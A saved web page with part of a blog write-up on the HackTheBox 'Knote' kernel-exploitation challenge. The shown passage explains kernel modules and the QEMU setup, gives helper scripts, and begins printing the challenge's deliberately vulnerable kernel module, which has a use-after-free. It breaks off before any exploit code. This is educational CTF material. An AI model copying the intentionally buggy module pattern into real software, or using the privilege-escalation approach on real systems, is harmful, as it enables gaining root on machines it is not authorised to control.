From: <Saved by Blink>
Snapshot-Content-Location: https://pwning.tech/knote/
Subject: Knote (HackTheBox)
Date: Thu, 18 May 2023 15:37:52 -0000
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--3mZeTGxybzrXQ57yZcOtuaPaDgF9pQQ9qye7bc9mn1----"


------MultipartBoundary--3mZeTGxybzrXQ57yZcOtuaPaDgF9pQQ9qye7bc9mn1----
Content-Type: text/html
Content-ID: <frame-22219BE3B730BC9F8A27E911D125C349@mhtml.blink>
Content-Transfer-Encoding: quoted-printable
Content-Location: https://pwning.tech/knote/

<!DOCTYPE html><html lang=3D"en" class=3D"dark-mode"><head><meta http-equiv=
=3D"Content-Type" content=3D"text/html; charset=3DUTF-8"><link rel=3D"style=
sheet" type=3D"text/css" href=3D"cid:css-504f126c-c959-4a59-bab5-b7ab07b9b2=
b6@mhtml.blink" /><link rel=3D"stylesheet" type=3D"text/css" href=3D"cid:cs=
s-d1c0d010-b8ca-4364-8f78-7e0af6aa9564@mhtml.blink" /><link rel=3D"styleshe=
et" type=3D"text/css" href=3D"cid:css-7af403b0-5a3a-48fc-ba6a-cc39d7008354@=
mhtml.blink" /><link rel=3D"stylesheet" type=3D"text/css" href=3D"cid:css-0=
10dd9cf-1eac-4bc5-959f-fe6af15db15e@mhtml.blink" />
<title>Knote (HackTheBox)</title>

<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta name=3D"HandheldFriendly" content=3D"True">
<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D1.=
0">
<link rel=3D"stylesheet" type=3D"text/css" href=3D"https://pwning.tech/asse=
ts/built/screen.css?v=3D4edf52f83a">
<link rel=3D"canonical" href=3D"https://pwning.tech/knote/">
<meta name=3D"referrer" content=3D"no-referrer-when-downgrade">
<meta property=3D"og:site_name" content=3D"Pwning Tech">
<meta property=3D"og:type" content=3D"article">
<meta property=3D"og:title" content=3D"Knote (HackTheBox)">
<meta property=3D"og:description" content=3D"Heya infosec folks, in this wr=
ite-up we will cover the Knote (kernel-note) kernel-pwn challenge on HackTh=
eBox. We can trigger a local privilege escalation attack by exploiting a us=
e-after-free bug. The description of the challenge is as follows:

Secure your secrets in the kernel space!


Summary

 * What are kernel modules?
 * How">
<meta property=3D"og:url" content=3D"https://pwning.tech/knote/">
<meta property=3D"og:image" content=3D"https://static.ghost.org/v4.0.0/imag=
es/publication-cover.jpg">
<meta property=3D"article:published_time" content=3D"2023-01-15T23:21:55.00=
0Z">
<meta property=3D"article:modified_time" content=3D"2023-02-22T05:51:22.000=
Z">
<meta property=3D"article:tag" content=3D"Binary Exploitation">
<meta property=3D"article:tag" content=3D"HackTheBox challenges">
<meta property=3D"article:tag" content=3D"Linux Syscalls">
<meta property=3D"article:tag" content=3D"x64 Assembly">
<meta property=3D"article:tag" content=3D"Linux Kernel">
<meta property=3D"article:tag" content=3D"Heap Memory">
<meta name=3D"twitter:card" content=3D"summary_large_image">
<meta name=3D"twitter:title" content=3D"Knote (HackTheBox)">
<meta name=3D"twitter:description" content=3D"Heya infosec folks, in this w=
rite-up we will cover the Knote (kernel-note) kernel-pwn challenge on HackT=
heBox. We can trigger a local privilege escalation attack by exploiting a u=
se-after-free bug. The description of the challenge is as follows:

Secure your secrets in the kernel space!


Summary

 * What are kernel modules?
 * How">
<meta name=3D"twitter:url" content=3D"https://pwning.tech/knote/">
<meta name=3D"twitter:image" content=3D"https://static.ghost.org/v4.0.0/ima=
ges/publication-cover.jpg">
<meta name=3D"twitter:label1" content=3D"Written by">
<meta name=3D"twitter:data1" content=3D"notselwyn">
<meta name=3D"twitter:label2" content=3D"Filed under">
<meta name=3D"twitter:data2" content=3D"Binary Exploitation, HackTheBox cha=
llenges, Linux Syscalls, x64 Assembly, Linux Kernel, Heap Memory">
<meta name=3D"twitter:site" content=3D"@notselwyn">
<meta property=3D"og:image:width" content=3D"7183">
<meta property=3D"og:image:height" content=3D"2885">

<meta name=3D"generator" content=3D"Ghost 5.35">
<link rel=3D"alternate" type=3D"application/rss+xml" title=3D"Pwning Tech" =
href=3D"https://pwning.tech/rss/">

<link href=3D"https://pwning.tech/webmentions/receive/" rel=3D"webmention">

<link rel=3D"stylesheet" type=3D"text/css" href=3D"https://pwning.tech/publ=
ic/cards.min.css?v=3D4edf52f83a">
<link rel=3D"stylesheet" href=3D"https://cdnjs.cloudflare.com/ajax/libs/pri=
sm/1.29.0/themes/prism-okaidia.min.css" crossorigin=3D"anonymous" referrerp=
olicy=3D"no-referrer">
<link rel=3D"stylesheet" href=3D"https://cdnjs.cloudflare.com/ajax/libs/pri=
sm/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" crossorigin=3D"a=
nonymous" referrerpolicy=3D"no-referrer">
</head>
<body class=3D"post-template tag-binexp tag-htb-challenges tag-syscalls tag=
-x64-assembly tag-linux-kernel tag-heap-memory tag-hash-import-2023-02-18-1=
6-45 is-head-left-logo has-cover is-dropdown-loaded">
<div class=3D"viewport">
<header id=3D"gh-head" class=3D"gh-head outer">
<div class=3D"gh-head-inner inner">
<div class=3D"gh-head-brand">
<a class=3D"gh-head-logo no-image" href=3D"https://pwning.tech/">
Pwning Tech
</a>
<button class=3D"gh-search gh-icon-btn" data-ghost-search=3D""><svg xmlns=
=3D"http://www.w3.org/2000/svg" fill=3D"none" viewBox=3D"0 0 24 24" stroke=
=3D"currentColor" stroke-width=3D"2" width=3D"20" height=3D"20"><path strok=
e-linecap=3D"round" stroke-linejoin=3D"round" d=3D"M21 21l-6-6m2-5a7 7 0 11=
-14 0 7 7 0 0114 0z"></path></svg></button>
<button class=3D"gh-burger"></button>
</div>
<nav class=3D"gh-head-menu">
<ul class=3D"nav">
<li class=3D"nav-home"><a href=3D"https://pwning.tech/">Home</a></li>
<li class=3D"nav-posts"><a href=3D"https://pwning.tech/posts/">Posts</a></l=
i>
<li class=3D"nav-about"><a href=3D"https://pwning.tech/about/">About</a></l=
i>
</ul>
</nav>
<div class=3D"gh-head-actions">
<button class=3D"gh-search gh-icon-btn" data-ghost-search=3D""><svg xmlns=
=3D"http://www.w3.org/2000/svg" fill=3D"none" viewBox=3D"0 0 24 24" stroke=
=3D"currentColor" stroke-width=3D"2" width=3D"20" height=3D"20"><path strok=
e-linecap=3D"round" stroke-linejoin=3D"round" d=3D"M21 21l-6-6m2-5a7 7 0 11=
-14 0 7 7 0 0114 0z"></path></svg></button>
</div>
</div>
</header>
<div class=3D"site-content">
<main id=3D"site-main" class=3D"site-main">
<article class=3D"article post tag-binexp tag-htb-challenges tag-syscalls t=
ag-x64-assembly tag-linux-kernel tag-heap-memory tag-hash-import-2023-02-18=
-16-45 featured no-image ">
<header class=3D"article-header gh-canvas">
<div class=3D"article-tag post-card-tags">
<span class=3D"post-card-primary-tag">
<a href=3D"https://pwning.tech/tag/binexp/">Binary Exploitation</a>
</span>
<span class=3D"post-card-featured"><svg width=3D"16" height=3D"17" viewBox=
=3D"0 0 16 17" fill=3D"none" xmlns=3D"http://www.w3.org/2000/svg">
<path d=3D"M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002=
C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14=
.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778=
 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.=
68127L6.99365 6.25002L4.49365 4.58752Z" stroke=3D"currentColor" stroke-widt=
h=3D"2" stroke-linecap=3D"round" stroke-linejoin=3D"round"></path>
</svg> Featured</span>
</div>
<h1 class=3D"article-title">Knote (HackTheBox)</h1>
<div class=3D"article-byline">
<section class=3D"article-byline-content">
<ul class=3D"author-list">
<li class=3D"author-list-item">
<a href=3D"https://pwning.tech/author/notselwyn-2/" class=3D"author-avatar =
author-profile-image"><svg viewBox=3D"0 0 24 24" xmlns=3D"http://www.w3.org=
/2000/svg"><g fill=3D"none" fill-rule=3D"evenodd"><path d=3D"M3.513 18.998C=
4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 =
12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4=
 4 1.79 5 4 5z" fill=3D"#FFF"></path></g></svg>
</a>
</li>
</ul>
<div class=3D"article-byline-meta">
<h4 class=3D"author-name"><a href=3D"https://pwning.tech/author/notselwyn-2=
/">notselwyn</a></h4>
<div class=3D"byline-meta-content">
<time class=3D"byline-meta-date" datetime=3D"2023-01-16">Jan 16, 2023</time=
>
<span class=3D"byline-reading-time"><span class=3D"bull">=E2=80=A2</span> 1=
6 min read</span>
</div>
</div>
</section>
</div>
</header>
<section class=3D"gh-content gh-canvas">
<p>Heya infosec folks, in this write-up we will cover the Knote (kernel-not=
e) kernel-pwn challenge on HackTheBox. We can trigger a <strong>local privi=
lege escalation</strong> attack by exploiting a <strong>use-after-free </st=
rong>bug. The description of the challenge is as follows:</p><blockquote>Se=
cure your secrets in the kernel space!</blockquote><h2 id=3D"summary">Summa=
ry</h2><ul><li>What are kernel modules?</li><li>How does this kernel CTF wo=
rk?</li><li>Analyzing the kmodule</li><li>Finding primitives</li><li>Creati=
ng an exploit</li><li>Creating a real world version</li></ul><h2 id=3D"what=
-are-kernel-modules">What are kernel modules?</h2><p>Linux kernel modules a=
re a way to extend the Linux kernel in a hotswappable way. Kernel modules a=
re also used for creating drivers, which is why it's useful to learn how to=
 exploit them. Thankfully, you can use the same pwn / exploitation techniqu=
es in kernel modules as in the core Linux kernel.</p><p>Kernel modules (kmo=
dules) can do a lot of things that the core kernel can do as well: manage a=
 virtual filesystem such as <code>/proc</code>, manage task structs, et cet=
era. They can register a device file as well, which you can use to communic=
ate with the kmodule using read(), write(), ioctl(), et cetera. </p><p>You =
can insert, list, and remove kernel modules by respectively using the binar=
ies <code>insmod</code>, <code>lsmod</code>, and <code>rmmod</code>. </p><h=
2 id=3D"how-do-kernel-pwn-ctfs-work">How do kernel pwn CTFs work?</h2><p>Th=
e goal of most kernel pwn CTFs are local privilege escalation exploits, in =
which a user becomes root in order to read a root-only flag file. Typically=
, you will be given 3 files: </p><ul><li><code>qemu.sh</code>: a BASH scrip=
t to run a QEMU command. QEMU (Quick EMUlator) is a FOSS instructionset sim=
ulator which you can use to run custom Linux kernels in custom filesystems.=
 It may sound like a VM, but it is not. </li><li><code>initramfs.cpio.gz</c=
ode> / <code>rootfs.img</code>: the custom (compressed) filesystem to run Q=
EMU with. </li><li><code>bzImage</code> : the custom Linux kernel to run QE=
MU with. </li></ul><p>Make sure to remove <code>-no-kvm</code> from <code>q=
emu.sh</code> as it is for old versions of Qemu. Also <strong>note that the=
re's no kaslr, no smap, no smep, etc</strong>. </p><figure class=3D"kg-card=
 kg-code-card"><pre class=3D"line-numbers language-bash" tabindex=3D"0"><co=
de class=3D"language-bash"><span class=3D"token shebang important">#!/bin/b=
ash</span>

<span class=3D"token function">timeout</span> <span class=3D"token paramete=
r variable">--foreground</span> <span class=3D"token number">35</span> qemu=
-system-x86_64 <span class=3D"token parameter variable">-m</span> 128M <spa=
n class=3D"token punctuation">\</span>
  <span class=3D"token parameter variable">-kernel</span> ./bzImage <span c=
lass=3D"token punctuation">\</span>
  <span class=3D"token parameter variable">-append</span> <span class=3D"to=
ken string">'console=3DttyS0 loglevel=3D3 oops=3Dpanic panic=3D1 nokaslr'</=
span> <span class=3D"token punctuation">\</span>
  <span class=3D"token parameter variable">-monitor</span> /dev/null <span =
class=3D"token punctuation">\</span>
  <span class=3D"token parameter variable">-initrd</span> ./initramfs.cpio.=
gz <span class=3D"token punctuation">\</span>
  <span class=3D"token parameter variable">-cpu</span> qemu64 <span class=
=3D"token punctuation">\</span>
  <span class=3D"token parameter variable">-smp</span> <span class=3D"token=
 assign-left variable">cores</span><span class=3D"token operator">=3D</span=
><span class=3D"token number">1</span> <span class=3D"token punctuation">\<=
/span>
  <span class=3D"token parameter variable">-nographic</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span></span></code></pre><figcaption>qemu.sh =
content</figcaption></figure><p>Now you might see that I use <code>initramf=
s.cpio.gz</code> instead of the <code>initramfs.cpio.gz</code> which is sup=
plied in the challenge. This is because I first extracted it using <code>cp=
io -iF rootfs.img</code>. After that, I used the following scripts to compr=
ess and decompress the resulting directory:</p><figure class=3D"kg-card kg-=
code-card"><pre class=3D"line-numbers language-bash" tabindex=3D"0"><code c=
lass=3D"language-bash"><span class=3D"token shebang important">#!/bin/bash<=
/span>

<span class=3D"token keyword">if</span> <span class=3D"token punctuation">[=
</span> <span class=3D"token string">"<span class=3D"token variable">$1</sp=
an>"</span> <span class=3D"token operator">=3D</span> <span class=3D"token =
string">""</span> <span class=3D"token punctuation">]</span><span class=3D"=
token punctuation">;</span> <span class=3D"token keyword">then</span>
    <span class=3D"token builtin class-name">echo</span> <span class=3D"tok=
en string">"usage: <span class=3D"token variable">$0</span> &lt;initramfs.c=
pio.gz&gt;"</span><span class=3D"token punctuation">;</span>
<span class=3D"token keyword">else</span>

    <span class=3D"token comment"># Decompress a .cpio.gz packed file syste=
m</span>
    <span class=3D"token function">mkdir</span> initramfs
    <span class=3D"token function">pushd</span> <span class=3D"token builti=
n class-name">.</span> <span class=3D"token operator">&amp;&amp;</span> <sp=
an class=3D"token function">pushd</span> initramfs
    <span class=3D"token function">cp</span> <span class=3D"token punctuati=
on">..</span>/<span class=3D"token variable">$1</span> <span class=3D"token=
 builtin class-name">.</span>
    <span class=3D"token function">gzip</span> <span class=3D"token paramet=
er variable">-dc</span> <span class=3D"token variable">$1</span> <span clas=
s=3D"token operator">|</span> cpio <span class=3D"token parameter variable"=
>-idm</span> <span class=3D"token operator">&amp;&gt;</span>/dev/null <span=
 class=3D"token operator">&amp;&amp;</span> <span class=3D"token function">=
rm</span> <span class=3D"token variable">$1</span>
    <span class=3D"token function">popd</span>
<span class=3D"token keyword">fi</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
/span></code></pre><figcaption>decompress.sh</figcaption></figure><figure c=
lass=3D"kg-card kg-code-card"><pre class=3D"line-numbers language-bash" tab=
index=3D"0"><code class=3D"language-bash"><span class=3D"token shebang impo=
rtant">#!/bin/bash</span>

<span class=3D"token comment"># Compress initramfs with the included static=
ally linked exploit</span>
<span class=3D"token assign-left variable">in</span><span class=3D"token op=
erator">=3D</span><span class=3D"token variable">$1</span>
<span class=3D"token assign-left variable">out</span><span class=3D"token o=
perator">=3D</span><span class=3D"token variable"><span class=3D"token vari=
able">$(</span><span class=3D"token builtin class-name">echo</span> $in <sp=
an class=3D"token operator">|</span> <span class=3D"token function">awk</sp=
an> '<span class=3D"token punctuation">{</span> print substr<span class=3D"=
token punctuation">(</span> $0, <span class=3D"token number">1</span>, leng=
th<span class=3D"token punctuation">(</span>$0<span class=3D"token punctuat=
ion">)</span>-2 <span class=3D"token variable">)</span></span> <span class=
=3D"token punctuation">}</span>'<span class=3D"token punctuation">)</span>
musl-gcc <span class=3D"token variable">$in</span> <span class=3D"token par=
ameter variable">-static</span> <span class=3D"token parameter variable">-p=
ie</span> <span class=3D"token parameter variable">-s</span> <span class=3D=
"token parameter variable">-O0</span> <span class=3D"token parameter variab=
le">-fPIE</span> <span class=3D"token parameter variable">-o</span> <span c=
lass=3D"token variable">$out</span> <span class=3D"token operator">||</span=
> <span class=3D"token builtin class-name">exit</span> <span class=3D"token=
 number">255</span>
<span class=3D"token function">mv</span> <span class=3D"token variable">$ou=
t</span> initramfs
<span class=3D"token function">pushd</span> <span class=3D"token builtin cl=
ass-name">.</span> <span class=3D"token operator">&amp;&amp;</span> <span c=
lass=3D"token function">pushd</span> initramfs
<span class=3D"token function">find</span> <span class=3D"token builtin cla=
ss-name">.</span> <span class=3D"token parameter variable">-print0</span> <=
span class=3D"token operator">|</span> cpio <span class=3D"token parameter =
variable">--null</span> <span class=3D"token parameter variable">--format</=
span><span class=3D"token operator">=3D</span>newc <span class=3D"token par=
ameter variable">-o</span> <span class=3D"token operator"><span class=3D"to=
ken file-descriptor important">2</span>&gt;</span>/dev/null <span class=3D"=
token operator">|</span> <span class=3D"token function">gzip</span> <span c=
lass=3D"token parameter variable">-9</span> <span class=3D"token operator">=
&gt;</span> <span class=3D"token punctuation">..</span>/initramfs.cpio.gz
<span class=3D"token function">popd</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span></span></code></pre><figcaption>compress=
.sh</figcaption></figure><p>So firstly I create an <code>initramfs.cpio.gz<=
/code> for QEMU using <code>irfs_compress.sh initramfs/exploit.c &amp;&amp;=
 ./qemu-cmd.sh</code>. Now, we can test QEMU by running <code>./qemu.sh</co=
de>:</p><figure class=3D"kg-card kg-code-card"><pre class=3D"line-numbers l=
anguage-sh" tabindex=3D"0"><code class=3D"language-sh">sh: can't access <sp=
an class=3D"token function">tty</span><span class=3D"token punctuation">;</=
span> job control turned off
~ $ <span class=3D"token function">whoami</span>
user
~ $<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><spa=
n></span><span></span><span></span></span></code></pre><figcaption>Qemu pro=
of-of-concept (PoC)</figcaption></figure><h2 id=3D"analyzing-the-kmodule">A=
nalyzing the kmodule</h2><p>We are given the following C sourcecode of the =
<code>knote.ko</code> kernel module:</p><figure class=3D"kg-card kg-code-ca=
rd"><pre class=3D"line-numbers language-c" tabindex=3D"0"><code class=3D"la=
nguage-c"><span class=3D"token macro property"><span class=3D"token directi=
ve-hash">#</span><span class=3D"token directive keyword">include</span> <sp=
an class=3D"token string">&lt;linux/kernel.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;linux/module.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;linux/device.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;linux/mutex.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;linux/fs.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;linux/slab.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;linux/uaccess.h&gt;</span></span>

<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">define</span> <span class=3D=
"token macro-name">DEVICE_NAME</span> <span class=3D"token string">"knote"<=
/span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">define</span> <span class=3D=
"token macro-name">CLASS_NAME</span> <span class=3D"token string">"knote"</=
span></span>

<span class=3D"token function">MODULE_AUTHOR</span><span class=3D"token pun=
ctuation">(</span><span class=3D"token string">"r4j"</span><span class=3D"t=
oken punctuation">)</span><span class=3D"token punctuation">;</span>
<span class=3D"token function">MODULE_DESCRIPTION</span><span class=3D"toke=
n punctuation">(</span><span class=3D"token string">"Secure your secrets in=
 the kernelspace"</span><span class=3D"token punctuation">)</span><span cla=
ss=3D"token punctuation">;</span>
<span class=3D"token function">MODULE_LICENSE</span><span class=3D"token pu=
nctuation">(</span><span class=3D"token string">"GPL"</span><span class=3D"=
token punctuation">)</span><span class=3D"token punctuation">;</span>

<span class=3D"token keyword">static</span> <span class=3D"token function">=
DEFINE_MUTEX</span><span class=3D"token punctuation">(</span>knote_ioctl_lo=
ck<span class=3D"token punctuation">)</span><span class=3D"token punctuatio=
n">;</span>
<span class=3D"token keyword">static</span> <span class=3D"token keyword">l=
ong</span> <span class=3D"token function">knote_ioctl</span><span class=3D"=
token punctuation">(</span><span class=3D"token keyword">struct</span> <spa=
n class=3D"token class-name">file</span> <span class=3D"token operator">*</=
span>file<span class=3D"token punctuation">,</span> <span class=3D"token ke=
yword">unsigned</span> <span class=3D"token keyword">int</span> cmd<span cl=
ass=3D"token punctuation">,</span> <span class=3D"token keyword">unsigned</=
span> <span class=3D"token keyword">long</span> arg<span class=3D"token pun=
ctuation">)</span><span class=3D"token punctuation">;</span>

<span class=3D"token keyword">static</span> <span class=3D"token keyword">i=
nt</span> major<span class=3D"token punctuation">;</span>
<span class=3D"token keyword">static</span> <span class=3D"token keyword">s=
truct</span> <span class=3D"token class-name">class</span> <span class=3D"t=
oken operator">*</span>knote_class  <span class=3D"token operator">=3D</spa=
n> <span class=3D"token constant">NULL</span><span class=3D"token punctuati=
on">;</span>
<span class=3D"token keyword">static</span> <span class=3D"token keyword">s=
truct</span> <span class=3D"token class-name">device</span> <span class=3D"=
token operator">*</span>knote_device <span class=3D"token operator">=3D</sp=
an> <span class=3D"token constant">NULL</span><span class=3D"token punctuat=
ion">;</span>
<span class=3D"token keyword">static</span> <span class=3D"token keyword">s=
truct</span> <span class=3D"token class-name">file_operations</span> knote_=
fops <span class=3D"token operator">=3D</span> <span class=3D"token punctua=
tion">{</span>
    <span class=3D"token punctuation">.</span>unlocked_ioctl <span class=3D=
"token operator">=3D</span> knote_ioctl
<span class=3D"token punctuation">}</span><span class=3D"token punctuation"=
>;</span>

<span class=3D"token keyword">struct</span> <span class=3D"token class-name=
">knote</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token keyword">char</span> <span class=3D"token operator=
">*</span>data<span class=3D"token punctuation">;</span>
    <span class=3D"token class-name">size_t</span> len<span class=3D"token =
punctuation">;</span>
    <span class=3D"token keyword">void</span> <span class=3D"token punctuat=
ion">(</span><span class=3D"token operator">*</span>encrypt_func<span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">(</span><s=
pan class=3D"token keyword">char</span> <span class=3D"token operator">*</s=
pan><span class=3D"token punctuation">,</span> <span class=3D"token class-n=
ame">size_t</span><span class=3D"token punctuation">)</span><span class=3D"=
token punctuation">;</span>
    <span class=3D"token keyword">void</span> <span class=3D"token punctuat=
ion">(</span><span class=3D"token operator">*</span>decrypt_func<span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">(</span><s=
pan class=3D"token keyword">char</span> <span class=3D"token operator">*</s=
pan><span class=3D"token punctuation">,</span> <span class=3D"token class-n=
ame">size_t</span><span class=3D"token punctuation">)</span><span class=3D"=
token punctuation">;</span>
<span class=3D"token punctuation">}</span><span class=3D"token punctuation"=
>;</span>

<span class=3D"token keyword">struct</span> <span class=3D"token class-name=
">knote_user</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token keyword">unsigned</span> <span class=3D"token keyw=
ord">long</span> idx<span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">char</span> <span class=3D"token operator=
">*</span> data<span class=3D"token punctuation">;</span>
    <span class=3D"token class-name">size_t</span> len<span class=3D"token =
punctuation">;</span>
<span class=3D"token punctuation">}</span><span class=3D"token punctuation"=
>;</span>

<span class=3D"token keyword">enum</span> <span class=3D"token class-name">=
knote_ioctl_cmd</span> <span class=3D"token punctuation">{</span>
    KNOTE_CREATE <span class=3D"token operator">=3D</span> <span class=3D"t=
oken number">0x1337</span><span class=3D"token punctuation">,</span>
    KNOTE_DELETE <span class=3D"token operator">=3D</span> <span class=3D"t=
oken number">0x1338</span><span class=3D"token punctuation">,</span>
    KNOTE_READ <span class=3D"token operator">=3D</span> <span class=3D"tok=
en number">0x1339</span><span class=3D"token punctuation">,</span>
    KNOTE_ENCRYPT <span class=3D"token operator">=3D</span> <span class=3D"=
token number">0x133a</span><span class=3D"token punctuation">,</span>
    KNOTE_DECRYPT <span class=3D"token operator">=3D</span> <span class=3D"=
token number">0x133b</span>
<span class=3D"token punctuation">}</span><span class=3D"token punctuation"=
>;</span>

<span class=3D"token keyword">struct</span> <span class=3D"token class-name=
">knote</span> <span class=3D"token operator">*</span>knotes<span class=3D"=
token punctuation">[</span><span class=3D"token number">10</span><span clas=
s=3D"token punctuation">]</span><span class=3D"token punctuation">;</span>

<span class=3D"token keyword">void</span> <span class=3D"token function">kn=
ote_encrypt</span><span class=3D"token punctuation">(</span><span class=3D"=
token keyword">char</span> <span class=3D"token operator">*</span> data<spa=
n class=3D"token punctuation">,</span> <span class=3D"token class-name">siz=
e_t</span> len<span class=3D"token punctuation">)</span> <span class=3D"tok=
en punctuation">{</span>
    <span class=3D"token keyword">int</span> i<span class=3D"token punctuat=
ion">;</span>
    <span class=3D"token keyword">for</span><span class=3D"token punctuatio=
n">(</span>i <span class=3D"token operator">=3D</span> <span class=3D"token=
 number">0</span><span class=3D"token punctuation">;</span> i <span class=
=3D"token operator">&lt;</span> len<span class=3D"token punctuation">;</spa=
n> <span class=3D"token operator">++</span>i<span class=3D"token punctuatio=
n">)</span>
        data<span class=3D"token punctuation">[</span>i<span class=3D"token=
 punctuation">]</span> <span class=3D"token operator">^=3D</span> <span cla=
ss=3D"token number">0xaa</span><span class=3D"token punctuation">;</span>
<span class=3D"token punctuation">}</span>

<span class=3D"token keyword">void</span> <span class=3D"token function">kn=
ote_decrypt</span><span class=3D"token punctuation">(</span><span class=3D"=
token keyword">char</span> <span class=3D"token operator">*</span>data<span=
 class=3D"token punctuation">,</span> <span class=3D"token class-name">size=
_t</span> len<span class=3D"token punctuation">)</span> <span class=3D"toke=
n punctuation">{</span>
    <span class=3D"token function">knote_encrypt</span><span class=3D"token=
 punctuation">(</span>data<span class=3D"token punctuation">,</span> len<sp=
an class=3D"token punctuation">)</span><span class=3D"token punctuation">;<=
/span>
<span class=3D"token punctuation">}</span>

<span class=3D"token keyword">static</span> <span class=3D"token keyword">l=
ong</span> <span class=3D"token function">knote_ioctl</span><span class=3D"=
token punctuation">(</span><span class=3D"token keyword">struct</span> <spa=
n class=3D"token class-name">file</span> <span class=3D"token operator">*</=
span>file<span class=3D"token punctuation">,</span> <span class=3D"token ke=
yword">unsigned</span> <span class=3D"token keyword">int</span> cmd<span cl=
ass=3D"token punctuation">,</span> <span class=3D"token keyword">unsigned</=
span> <span class=3D"token keyword">long</span> arg<span class=3D"token pun=
ctuation">)</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token function">mutex_lock</span><span class=3D"token pu=
nctuation">(</span><span class=3D"token operator">&amp;</span>knote_ioctl_l=
ock<span class=3D"token punctuation">)</span><span class=3D"token punctuati=
on">;</span>
    <span class=3D"token keyword">struct</span> <span class=3D"token class-=
name">knote_user</span> ku<span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span><span class=3D"token punctuation=
">(</span><span class=3D"token function">copy_from_user</span><span class=
=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span>k=
u<span class=3D"token punctuation">,</span> <span class=3D"token punctuatio=
n">(</span><span class=3D"token keyword">void</span> <span class=3D"token o=
perator">*</span><span class=3D"token punctuation">)</span>arg<span class=
=3D"token punctuation">,</span> <span class=3D"token keyword">sizeof</span>=
<span class=3D"token punctuation">(</span><span class=3D"token keyword">str=
uct</span> <span class=3D"token class-name">knote_user</span><span class=3D=
"token punctuation">)</span><span class=3D"token punctuation">)</span><span=
 class=3D"token punctuation">)</span>
        <span class=3D"token keyword">return</span> <span class=3D"token op=
erator">-</span>EFAULT<span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">switch</span><span class=3D"token punctua=
tion">(</span>cmd<span class=3D"token punctuation">)</span> <span class=3D"=
token punctuation">{</span>
        <span class=3D"token keyword">case</span> KNOTE_CREATE<span class=
=3D"token operator">:</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>ku<span class=3D"token punctuation">.</span>len <span cla=
ss=3D"token operator">&gt;</span> <span class=3D"token number">0x20</span> =
<span class=3D"token operator">||</span> ku<span class=3D"token punctuation=
">.</span>idx <span class=3D"token operator">&gt;=3D</span> <span class=3D"=
token number">10</span><span class=3D"token punctuation">)</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
            <span class=3D"token keyword">char</span> <span class=3D"token =
operator">*</span>data <span class=3D"token operator">=3D</span> <span clas=
s=3D"token function">kmalloc</span><span class=3D"token punctuation">(</spa=
n>ku<span class=3D"token punctuation">.</span>len<span class=3D"token punct=
uation">,</span> GFP_KERNEL<span class=3D"token punctuation">)</span><span =
class=3D"token punctuation">;</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
> <span class=3D"token operator">=3D</span> <span class=3D"token function">=
kmalloc</span><span class=3D"token punctuation">(</span><span class=3D"toke=
n keyword">sizeof</span><span class=3D"token punctuation">(</span><span cla=
ss=3D"token keyword">struct</span> <span class=3D"token class-name">knote</=
span><span class=3D"token punctuation">)</span><span class=3D"token punctua=
tion">,</span> GFP_KERNEL<span class=3D"token punctuation">)</span><span cl=
ass=3D"token punctuation">;</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>data <span class=3D"token operator">=3D=3D</span> <span c=
lass=3D"token constant">NULL</span> <span class=3D"token operator">||</span=
> knotes<span class=3D"token punctuation">[</span>ku<span class=3D"token pu=
nctuation">.</span>idx<span class=3D"token punctuation">]</span> <span clas=
s=3D"token operator">=3D=3D</span> <span class=3D"token constant">NULL</spa=
